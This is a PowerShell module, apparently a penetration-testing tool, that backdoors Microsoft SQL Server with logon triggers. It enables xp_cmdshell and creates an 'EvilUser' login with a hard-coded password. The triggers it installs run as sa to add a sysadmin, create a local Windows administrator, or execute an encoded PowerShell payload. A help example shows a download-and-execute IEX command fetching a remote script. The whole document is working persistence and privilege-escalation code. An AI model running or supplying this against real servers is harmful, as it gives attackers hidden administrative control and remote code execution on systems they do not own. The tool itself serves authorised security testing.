function Invoke-SqlServer-Persist-TriggerLogon
{
    <#
	.SYNOPSIS
	This script can be used backdoor a Windows system using SQL Serverlogon triggers.

	.DESCRIPTION
	This script can be used backdoor a Windows system using a SQL Server logon triggers.
	As a result, the associated TSQL will execute when any the attack attempts tog login as eviluser with
	the password "Password123!". This script supports the executing operating system 
	and PowerShell commands as the SQL Server service account using the native xp_cmdshell stored procedure. 
	The script also support add a new sysadmin. This script can be run as the current Windows user or a 
	SQL Server login can be provided. Note: 

	.EXAMPLE
	Create a logon trigger to add a new sysadmin.  The example shows the script being run using a SQL Login.

	PS C:\> Invoke-SqlServer-Persist-TriggerLogon -SqlServerInstance "SERVERNAME\INSTANCENAME" -SqlUser MySQLAdmin -SqlPass MyPassword123! -NewSqlUser mysqluser -NewSqlPass NewPassword123! 

	.EXAMPLE
	Create a logon trigger to add a local administrator to the Windows OS via xp_cmdshell.  The example shows the script 
	being run as the current windows user.

	PS C:\> Invoke-SqlServer-Persist-TriggerLogon -SqlServerInstance "SERVERNAME\INSTANCENAME" -NewOsUser myosuser -NewOsPass NewPassword123!

	.EXAMPLE
	Create a logon trigger to run a PowerShell command via xp_cmdshell. The example below downloads a PowerShell script and 
	from the internet and executes it.  The example shows the script being run as the current Windows user.

	PS C:\> Invoke-SqlServer-Persist-TriggerLogon -Verbose -SqlServerInstance "SERVERNAME\INSTANCENAME" -PsCommand "IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1')"
	
	.EXAMPLE
	Remove evil logon triggers as the current Windows user.

	PS C:\> Invoke-SqlServer-Persist-TriggerLogon -Verbose -SqlServerInstance "SERVERNAME\INSTANCENAME" -Remove

	.LINK
	http://www.netspi.com
	https://technet.microsoft.com/en-us/library/ms186582(v=sql.90).aspx

	.NOTES
	Author: Scott Sutherland - 2016, NetSPI
	Version: Invoke-SqlServer-Persist-TriggerLogon.psm1 v1.0
    #>

  [CmdletBinding()]
  Param(
    
    [Parameter(Mandatory=$false,
    HelpMessage='Set SQL Login username.')]
    [string]$SqlUser,
    
    [Parameter(Mandatory=$false,
    HelpMessage='Set SQL Login password.')]
    [string]$SqlPass,

    [Parameter(Mandatory=$false,
    HelpMessage='Set username for new SQL Server sysadmin login.')]
    [string]$NewSqlUser,
    
    [Parameter(Mandatory=$false,
    HelpMessage='Set password for new SQL Server sysadmin login.')]
    [string]$NewSqlPass,

    [Parameter(Mandatory=$false,
    HelpMessage='Set username for new Windows local administrator account.')]
    [string]$NewOsUser,
    
    [Parameter(Mandatory=$false,
    HelpMessage='Set password for new Windows local administrator account.')]
    [string]$NewOsPass,

    [Parameter(Mandatory=$false,
    HelpMessage='Create trigger that will run the provide PowerShell command.')]
    [string]$PsCommand,

    [Parameter(Mandatory=$true,
    HelpMessage='Set target SQL Server instance.')]
    [string]$SqlServerInstance,

    [Parameter(Mandatory=$false,
    HelpMessage='This will remove the trigger named evil_DDL_trigger create by this script.')]
    [Switch]$Remove
  )

    # -----------------------------------------------
    # Setup database connection string
    # -----------------------------------------------
    
    # Create fun connection object
    $conn = New-Object System.Data.SqlClient.SqlConnection
    
    # Set authentication type and create connection string
    if($SqlUser){
    
        # SQL login / alternative domain credentials
         Write-Output "[*] Attempting to authenticate to $SqlServerInstance with SQL login $SqlUser..."
        $conn.ConnectionString = "Server=$SqlServerInstance;Database=master;User ID=$SqlUser;Password=$SqlPass;"
        [string]$ConnectUser = $SqlUser
    }else{
            
        # Trusted connection
        Write-Output "[*] Attempting to authenticate to $SqlServerInstance as the current Windows user..."
        $conn.ConnectionString = "Server=$SqlServerInstance;Database=master;Integrated Security=SSPI;"   
        $UserDomain = [Environment]::UserDomainName
        $Username = [Environment]::UserName
        $ConnectUser = "$UserDomain\$Username"                    
     }


    # -------------------------------------------------------
    # Test database connection
    # -------------------------------------------------------

    try{
        $conn.Open()
        Write-Host "[*] Connected." 
        $conn.Close()
    }catch{
        $ErrorMessage = $_.Exception.Message
        Write-Host "[*] Connection failed" -foreground "red"
        Write-Host "[*] Error: $ErrorMessage" -foreground "red"  
        Break
    }


    # -------------------------------------------------------
    # Check if the user is a sysadmin
    # -------------------------------------------------------

    # Open db connection
    $conn.Open()

    # Setup query
    $Query = "select is_srvrolemember('sysadmin') as sysstatus"

    # Execute query
    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
    $results = $cmd.ExecuteReader() 

    # Parse query results
    $TableIsSysAdmin = New-Object System.Data.DataTable
    $TableIsSysAdmin.Load($results)  

    # Check if current user is a sysadmin
    $TableIsSysAdmin | Select-Object -First 1 sysstatus | foreach {

        $Checksysadmin = $_.sysstatus
        if ($Checksysadmin -ne 0){
            Write-Host "[*] Confirmed Sysadmin access."                             
        }else{
            Write-Host "[*] The current user does not have sysadmin privileges." -foreground "red"
            Write-Host "[*] Sysadmin privileges are required." -foreground "red"
            Break
        }
    }

    # Close db connection
    $conn.Close()

    # -------------------------------------------------------
    # Enabled Show Advanced Options - needed for xp_cmdshell
    # ------------------------------------------------------- 
    
    # Status user
    Write-Host "[*] Enabling 'Show Advanced Options', if required..."
    
    # Open db connection
    $conn.Open()

    # Setup query 
    $Query = "IF (select value_in_use from sys.configurations where name = 'Show Advanced Options') = 0
    EXEC ('sp_configure ''Show Advanced Options'',1;RECONFIGURE')"

    # Execute query 
    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
    $results = $cmd.ExecuteReader() 
        
    # Close db connection
    $conn.Close()    
    

    # -------------------------------------------------------
    # Enabled xp_cmdshell - needed for os commands
    # -------------------------------------------------------

    Write-Host "[*] Enabling 'xp_cmdshell', if required..."  
    
    # Open db connection
    $conn.Open()

    # Setup query 
    $Query = "IF (select value_in_use from sys.configurations where name = 'xp_cmdshell') = 0
    EXEC ('sp_configure ''xp_cmdshell'',1;RECONFIGURE')"

    # Execute query 
    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
    $results = $cmd.ExecuteReader() 
        
    # Close db connection
    $conn.Close()  


    # -------------------------------------------------------
    # Check if the service account is local admin
    # -------------------------------------------------------
    
    Write-Host "[*] Checking if service account is a local administrator..."  

    # Open db connection
    $conn.Open()

    # Setup query 
    $Query = @"

                        -- Setup reg path 
                        DECLARE @SQLServerInstance varchar(250)  
                        if @@SERVICENAME = 'MSSQLSERVER'
                        BEGIN											
                            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
                        END						
                        ELSE
                        BEGIN
                            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))		
                        END

                        -- Grab service account from service's reg path
                        DECLARE @ServiceaccountName varchar(250)  
                        EXECUTE master.dbo.xp_instance_regread  
                        N'HKEY_LOCAL_MACHINE', @SQLServerInstance,  
                        N'ObjectName',@ServiceAccountName OUTPUT, N'no_output' 

                        DECLARE @MachineType  SYSNAME
                        EXECUTE master.dbo.xp_regread
                        @rootkey      = N'HKEY_LOCAL_MACHINE',
                        @key          = N'SYSTEM\CurrentControlSet\Control\ProductOptions',
                        @value_name   = N'ProductType', 
                        @value        = @MachineType output
                        
                        -- Grab more info about the server
                        SELECT @ServiceAccountName as SvcAcct
"@

    # Execute query
    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
    $results = $cmd.ExecuteReader() 

    # Parse query results
    $TableServiceAccount = New-Object System.Data.DataTable
    $TableServiceAccount.Load($results)  
    $SqlServeServiceAccountDirty = $TableServiceAccount | select SvcAcct -ExpandProperty SvcAcct 
    $SqlServeServiceAccount = $SqlServeServiceAccountDirty -replace '\.\\',''
        
    # Close db connection
    $conn.Close() 

    # Open db connection
    $conn.Open()

    # Setup query 
    $Query = "EXEC master..xp_cmdshell 'net localgroup Administrators';"

    # Execute query 
    $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
    $results = $cmd.ExecuteReader() 

    # Parse query results
    $TableServiceAccountPriv = New-Object System.Data.DataTable
    $TableServiceAccountPriv.Load($results)  
        
    # Close db connection
    $conn.Close()  

    if($SqlServeServiceAccount -eq "LocalSystem" -or $TableServiceAccountPriv -contains "$SqlServeServiceAccount"){
        Write-Host "[*] The service account $SqlServeServiceAccount has local administrator privileges."  
        $SvcAdmin = 1
    }else{
        Write-Host "[*] The service account $SqlServeServiceAccount does NOT have local administrator privileges." 
        $SvcAdmin = 0 
    }

    # -------------------------------------------------------
    # Add User for Logon triggers
    # -------------------------------------------------------
    if(($NewSqlUser) -or ($PsCommand) -or ($NewOsUser)){

        # Status user
        Write-Host "[*] Adding EvilUser with password Password123! to be used with logon trigger..." 

        # Create query
        $Query = "IF NOT EXISTS (SELECT * FROM sys.syslogins WHERE name = 'EvilUser')
        exec('CREATE LOGIN [EvilUser] WITH PASSWORD = ''Password123!''')"

        # Open db connection
        $conn.Open()

        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
        $results = $cmd.ExecuteReader() 
        
        # Close db connection
        $conn.Close()

        Write-Host "[*] The EvilUser has been added with password Password123! to use with logon trigger." -foreground "green"
    }

    # -------------------
    # Setup the pscommand
    # -------------------
    $Query_PsCommand = ""
     if($PsCommand){

        # Status user
        Write-Host "[*] Creating encoding PowerShell payload..." -foreground "green"
        
        # Check for local administrator privs 
        if($SvcAdmin -eq 0){
            Write-Host "[*] Note: PowerShell won't be able to take administrative actions due to the service account configuration." -foreground "green"
        }

        # This encoding method was based on a function by Carlos Perez 
        # https://raw.githubusercontent.com/darkoperator/Posh-SecMod/master/PostExploitation/PostExploitation.psm1

        # Encode PowerShell command
        $CmdBytes = [Text.Encoding]::Unicode.GetBytes($PsCommand)
        $EncodedCommand = [Convert]::ToBase64String($CmdBytes)

        # Check if PowerShell command is too long
        If ($EncodedCommand.Length -gt 8100)
        {
            Write-Host "PowerShell encoded payload is too long so the PowerShell command will not be added." -foreground "red"
        }else{

            # Create query
            $Query_PsCommand = "EXEC master..xp_cmdshell ''PowerShell -enc $EncodedCommand'';" 

             # Open db connection
            $conn.Open()

            # Setup query 
            $Query = "IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'evil_logon_trigger_pscmd') 
            DROP TRIGGER [evil_logon_trigger_pscmd] ON ALL SERVER
            exec('CREATE Trigger [evil_logon_trigger_pscmd] 
            on ALL Server
            For LOGON WITH EXECUTE AS ''sa''
            AS
            IF ORIGINAL_LOGIN() = ''EvilUser''
            $Query_PsCommand;
            END')"

            $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
            $results = $cmd.ExecuteReader() 
        
            # Close db connection
            $conn.Close()

            Write-Host "[*] Payload generated." -foreground "green"
        }
    }else{
        Write-Host "[*] Note: No PowerShell will be executed, because the parameters weren't provided." 
    }

    # -------------------
    # Setup newosuser
    # -------------------
    $Query_OsAddUser = ""
    if($NewOsUser){

        # Status user
        Write-Host "[*] Creating payload to add OS user..." -foreground "green"

        # Check for local administrator privs 
        if($SvcAdmin -eq 0){

            # Status user
            Write-Host "[*] No OS admin will be created, because the service account does not have local administrator privileges."
        }else{

            # Create query
            $Query_OsAddUser = "EXEC master..xp_cmdshell ''net user $NewOsUser $NewOsPass /add & net localgroup administrators /add $NewOsUser'';"

            # Open db connection
            $conn.Open()

            # Setup query 
            $Query = "IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'evil_logon_trigger_addosadmin') 
            DROP TRIGGER [evil_logon_trigger_addosadmin] ON ALL SERVER
            exec('CREATE Trigger [evil_logon_trigger_addosadmin] 
            on ALL Server WITH EXECUTE AS ''sa''
            For LOGON
            AS
            IF ORIGINAL_LOGIN() = ''EvilUser''
            $Query_OsAddUser;
            END')"

            $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
            $results = $cmd.ExecuteReader() 
        
            # Close db connection
            $conn.Close()

            # Status user
            Write-Host "[*] Payload generated." -foreground "green"
        }
    }else{
        Write-Host "[*] Note: No OS admin will be created, because the parameters weren't provided." 
    }
    
    # -----------------------------------------
    # Create logon trigger to add sysadmin
    # -----------------------------------------
    $Query_SysAdmin = ""
    if($NewSqlUser){

        # Status user
        Write-Host "[*] Generating payload to add sysadmin..." -foreground "green" 
        
        # Create query
        $Query_SysAdmin = "IF NOT EXISTS (SELECT * FROM sys.syslogins WHERE name = ''$NewSqlUser'')
        exec(''CREATE LOGIN [$NewSqlUser] WITH PASSWORD = ''''$NewSqlPass'''';EXEC sp_addsrvrolemember ''''$NewSqlUser'''', ''''sysadmin'''';'')"

        # Open db connection
        $conn.Open()

        # Setup query 
        $Query = "IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'evil_logon_trigger_addsysadmin') 
        DROP TRIGGER [evil_logon_trigger_addsysadmin] ON ALL SERVER
        exec('CREATE Trigger [evil_logon_trigger_addsysadmin] 
        on ALL Server WITH EXECUTE AS ''sa''
        For LOGON
        AS
        BEGIN
        IF ORIGINAL_LOGIN() = ''EvilUser''
        $Query_SysAdmin;
        END')"

        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
        $results = $cmd.ExecuteReader() 
        
        # Close db connection
        $conn.Close()

        # Status user
        Write-Host "[*] Payload generated." -foreground "green"
    }else{
        Write-Host "[*] Note: No sysadmin will be created, because the parameters weren't provided."
        Break 
    }

    

    # -------------------------------------------------------
    # Remove Logon triggers
    # -------------------------------------------------------
    if($Remove){

        # Status user
        Write-Host "[*] Removing trigger named evil_DDL_trigger..." 

        # ---------------------------
        # Create procedure
        # ---------------------------

        # Open db connection
        $conn.Open()

        # Setup query 
        $Query = "IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'evil_logon_trigger') 
        DROP TRIGGER [evil_logon_trigger_addsysadmin] ON ALL SERVER;
        DROP TRIGGER [evil_logon_trigger_addosadmin] ON ALL SERVER;
        DROP TRIGGER [evil_logon_trigger_pscmd] ON ALL SERVER;
        DROP LOGIN [EvilUser];"

        $cmd = New-Object System.Data.SqlClient.SqlCommand($Query,$conn)
        $results = $cmd.ExecuteReader() 
        
        # Close db connection
        $conn.Close()

        Write-Host "[*] The evil_logon_trigger trigger has been been removed." -foreground "green"
    }

    Write-Host "[*] All done."
}

